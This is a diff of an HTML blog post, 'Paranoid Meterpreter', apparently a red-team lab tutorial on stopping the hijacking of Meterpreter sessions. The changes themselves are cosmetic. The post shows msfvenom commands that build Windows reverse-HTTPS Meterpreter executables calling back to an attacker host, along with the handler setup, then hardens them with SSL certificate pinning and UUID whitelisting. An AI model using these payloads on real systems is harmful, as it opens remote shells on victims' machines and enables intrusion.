@@ -5,7 +5,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.15" />
+<meta name="generator" content="Hugo 0.18.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="stylesheet" href="https://rastamouse.me/css/style.css" type="text/css">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
@@ -44,13 +44,13 @@
   </div>
   <h1 class="headline" itemprop="headline">Paranoid Meterpreter</h1>
   <section class="body" itemprop="articleBody">
-    
+    <p>There I was, minding my own business… Casually scrolling down my Twitter feed when I noticed a post from <a href="https://twitter.com/TheColonial">OJ</a>, entitled <a href="https://github.com/rapid7/metasploit-framework/wiki/The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers">The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers</a>. A bit of a mouthful, it summerises the difference between the WinInet and WinHTTP API’s and what that means for Meterpreter.</p>
 
-<p>There I was, minding my own business… Casually scrolling down my Twitter feed when I noticed a post from <a href="https://twitter.com/TheColonial">OJ</a>, entitled <a href="https://github.com/rapid7/metasploit-framework/wiki/The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers">The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers</a>. A bit of a mouthful, it summerises the difference between the WinInet and WinHTTP API’s and what that means for Meterpreter.</p>
+<p></p>
 
 <p>Go ahead and check out that post for the gorey details. I was particularly interested in a feature called ‘Paranoid Meterpreter’, which is basically a means of preventing other people from hijacking your juicy, hard earned shells. This post is a simplistic example of how a Meterpreter shell can be hijacked and how this can be prevented. You can also read HD Moore’s original article <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode">here</a>.</p>
 
-<h2 id="the-setup:f3f1e512da087be2580e1e7c8828bf5c">The Setup</h2>
+<h2 id="the-setup">The Setup</h2>
 
 <ul>
 <li>1 x Windows 7: Victim (192.168.56.102)</li>
@@ -71,16 +71,16 @@
 
 <p>The two payloads don’t appear all that different in the Metasploit Framework and they appear to functional identically if you are not using any of the differentiating features from the respective APIs.</p>
 
-<h2 id="scenario-1-wininet:f3f1e512da087be2580e1e7c8828bf5c">Scenario 1: WinInet</h2>
+<h2 id="scenario-1-wininet">Scenario 1: WinInet</h2>
 
 <p>This is the payload the majority of people will likely be familar with, not least because it has been present in the framework for longer.</p>
 
-<h3 id="generate-the-payload:f3f1e512da087be2580e1e7c8828bf5c">Generate the Payload</h3>
+<h3 id="generate-the-payload">Generate the Payload</h3>
 
 <pre><code class="language-text">msfvenom -p windows/meterpreter/reverse_https LHOST=kali LPORT=443 -f exe -o /root/wininet.exe
 </code></pre>
 
-<h2 id="handler-exploit:f3f1e512da087be2580e1e7c8828bf5c">Handler &amp; Exploit</h2>
+<h2 id="handler-exploit">Handler &amp; Exploit</h2>
 
 <pre><code class="language-text">msf &gt; use exploit/multi/handler
 msf exploit(handler) &gt; set payload windows/meterpreter/reverse_https
@@ -107,17 +107,17 @@ msf exploit(handler) &gt; run
 
 <p>The would-be attacker (.101) gets the shell. This is because there is no mutual validation between the stager and the handler.</p>
 
-<h2 id="scenario-2-winhttp:f3f1e512da087be2580e1e7c8828bf5c">Scenario 2: WinHTTP</h2>
+<h2 id="scenario-2-winhttp">Scenario 2: WinHTTP</h2>
 
 <p>This API enables Meterpreter to verify the SHA1 hash of the SSL certificate presented by the Framework. This requirement is enforced by both the handler and payload stager.</p>
 
-<h3 id="generate-an-ssl-cert:f3f1e512da087be2580e1e7c8828bf5c">Generate an SSL Cert</h3>
+<h3 id="generate-an-ssl-cert">Generate an SSL Cert</h3>
 
 <pre><code class="language-text">openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout meterpreter.key -out meterpreter.crt
 cat meterpreter.key meterpreter.crt &gt; meterpreter.pem
 </code></pre>
 
-<h2 id="generate-the-payload-1:f3f1e512da087be2580e1e7c8828bf5c">Generate the Payload</h2>
+<h2 id="generate-the-payload-1">Generate the Payload</h2>
 
 <pre><code class="language-text">msfvenom -p windows/meterpreter/reverse_winhttps LHOST=kali LPORT=443 HandlerSSLCert=meterpreter.pem StagerVerifySSLCert=true -f exe -o winhttps.exe
 
@@ -125,7 +125,7 @@ cat meterpreter.key meterpreter.crt &gt; meterpreter.pem
 [*] Writing 73802 bytes to /root/winhttps.exe...
 </code></pre>
 
-<h2 id="handler-exploit-1:f3f1e512da087be2580e1e7c8828bf5c">Handler &amp; Exploit</h2>
+<h2 id="handler-exploit-1">Handler &amp; Exploit</h2>
 
 <pre><code class="language-text">msf &gt; use exploit/multi/handler
 msf exploit(handler) &gt; set payload windows/meterpreter/reverse_winhttps
@@ -157,12 +157,11 @@ msf exploit(handler) &gt; run
 
 <p>Because the other attacker does not have the SSL cert, they cannot validate themselves to the Stager and the Meterpreter session closes.</p>
 
-<h2 id="moar-paranoia:f3f1e512da087be2580e1e7c8828bf5c">Moar Paranoia</h2>
+<h2 id="moar-paranoia">Moar Paranoia</h2>
 
 <p>It’s possible to take this level of paranoia to the next level using UUID validation. In the examples above, we can see that &lsquo;random&rsquo; UUID names are given.  <a href="https://github.com/rapid7/metasploit-framework/wiki/Payload-UUID">More info here</a>. But payloads can be assigned specific UUIDs using <code>PayloadUUIDTracking=true</code> and <code>PayloadUUIDName=&lt;name&gt;</code> parameters.</p>
 
 <p>The handler can be given the <code>IgnoreUnknownPayloads</code> true parameter, so that it will only accept stagers with your own whitelisted UUIDs.</p>
-
   </section>
 </article>
 
